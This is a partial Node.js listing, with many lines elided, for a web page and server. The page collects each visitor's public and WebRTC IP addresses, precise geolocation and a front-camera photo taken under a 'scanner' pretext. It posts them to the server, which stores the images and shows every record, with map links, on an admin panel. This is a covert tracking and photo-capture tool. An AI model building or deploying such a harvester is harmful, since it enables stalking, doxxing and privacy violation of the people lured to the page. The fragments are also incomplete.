...
function ipLabel(ip, type) {
  ...
  if (isPublicIP(ip)) {
    return `<span style="color:#0ff;">[${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  } else {
    return `<span style="color:#ff0;">[${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  }
}
...
const server = http.createServer((req, res) => {
    ...
    req.on('end', () => {
      try {
        ...
        if (data.image) {
          ...
          fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image.split(",")[1] || data.image, 'base64'));
  ...
  if (req.url === '/admin') {
    ...
    let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title><style>'+
    ...
    dataArr.forEach((rec, i) => {
      ...
      if (rec.geolocation) {
        out += `<span class="label">Geolocation:</span> <a class="geo" target="_blank" href="https://maps.google.com/?q=${rec.geolocation.lat},${rec.geolocation.lng}">${rec.geolocation.lat},${rec.geolocation.lng}</a> <span style="color:#00f;">(±${rec.geolocation.acc}m)</span><br>`;
      }
...
<body>
  ...
  <script>
    const payload = { serverObservedIP: "${serverIP}", publicIP: null, geolocation: null, webrtcIPs: [], image: null };

    // External IP
    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{ payload.publicIP=d.ip; send(); });
    ...
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos=>{
        ...
        document.getElementById('map').innerHTML =
          ...
          'src="https://www.openstreetmap.org/export/embed.html?bbox='+(pos.coords.longitude-0.05)+'%2C'+(pos.coords.latitude-0.05)+'%2C'+(pos.coords.longitude+0.05)+'%2C'+(pos.coords.latitude+0.05)+'&layer=mapnik&marker='+pos.coords.latitude+'%2C'+pos.coords.longitude+'" allowfullscreen></iframe>';
        send();
      });
    }
    ...
    function startScanner() {
      navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } })
        ...
        .catch(err=>{ console.log(err); alert("Failed to initialize camera."); });
    }

    function send(force){
      fetch("/report",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
    }
  </script>
</body>
</html>`;
